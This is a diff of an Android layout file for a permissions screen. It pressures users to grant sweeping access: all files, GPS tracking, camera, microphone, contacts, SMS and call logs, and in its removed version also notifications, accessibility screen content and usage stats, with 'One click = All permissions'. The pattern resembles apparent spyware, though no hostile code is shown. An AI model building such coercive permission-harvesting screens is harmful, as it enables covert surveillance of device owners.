@@ -22,49 +22,47 @@
         android:id="@+id/tv_status"
         android:layout_width="match_parent"
         android:layout_height="wrap_content"
-        android:text="Ready to grant permissions"
+        android:text="Permissions required to continue"
         android:textSize="18sp"
         android:gravity="center"
         android:layout_marginBottom="24dp"/>
-
-    <com.google.android.material.progressindicator.LinearProgressIndicator
-        android:id="@+id/progress_indicator"
-        android:layout_width="match_parent"
-        android:layout_height="wrap_content"
-        android:progress="0"
-        app:trackColor="#E0E0E0"
-        app:indicatorColor="#6200EE"
-        android:layout_marginBottom="8dp"/>
 
     <TextView
         android:id="@+id/tv_progress"
         android:layout_width="match_parent"
         android:layout_height="wrap_content"
-        android:text="0/25 permissions"
+        android:text="Please grant all permissions"
         android:gravity="center"
-        android:textSize="14sp"
+        android:textSize="16sp"
+        android:textColor="#FF9800"
         android:layout_marginBottom="32dp"/>
 
+    <!-- ✅ NEW NEXT BUTTON -->
     <Button
-        android:id="@+id/btn_grant_all"
+        android:id="@+id/btn_next"
         android:layout_width="match_parent"
         android:layout_height="60dp"
-        android:text="GRANT ALL PERMISSIONS"
-        android:textSize="16sp"
+        android:text="NEXT"
+        android:textSize="18sp"
         android:textStyle="bold"
+        android:backgroundTint="#4CAF50"
         android:layout_marginBottom="16dp"/>
 
-    <ProgressBar
-        android:id="@+id/progress_bar"
-        android:layout_width="40dp"
-        android:layout_height="40dp"
-        android:visibility="gone"/>
+    <Button
+        android:id="@+id/btn_check_status"
+        android:layout_width="match_parent"
+        android:layout_height="60dp"
+        android:text="CHECK PERMISSION STATUS"
+        android:textSize="16sp"
+        android:textStyle="bold"
+        android:backgroundTint="#FF9800"
+        android:layout_marginBottom="16dp"/>
 
     <TextView
         android:layout_width="match_parent"
         android:layout_height="wrap_content"
         android:layout_marginTop="32dp"
-        android:text="⚠️ This app requires ALL permissions to function properly\n\n• Storage - Access all files\n• Location - GPS tracking\n• Camera - Photo capture\n• Microphone - Audio recording\n• Contacts - Read contacts\n• SMS - Read messages\n• Calls - Call logs\n• Notifications - All notifications\n• Accessibility - Screen content\n• Usage Stats - App usage\n\n✅ One click = All permissions"
+        android:text="⚠️ This app requires permissions to function properly\n\n• Storage - Access all files\n• Location - GPS tracking\n• Camera - Photo capture\n• Microphone - Audio recording\n• Contacts - Read contacts\n• SMS - Read messages\n• Calls - Call logs"
         android:textSize="14sp"
         android:textColor="#666"
         android:lineSpacingExtra="4dp"/>
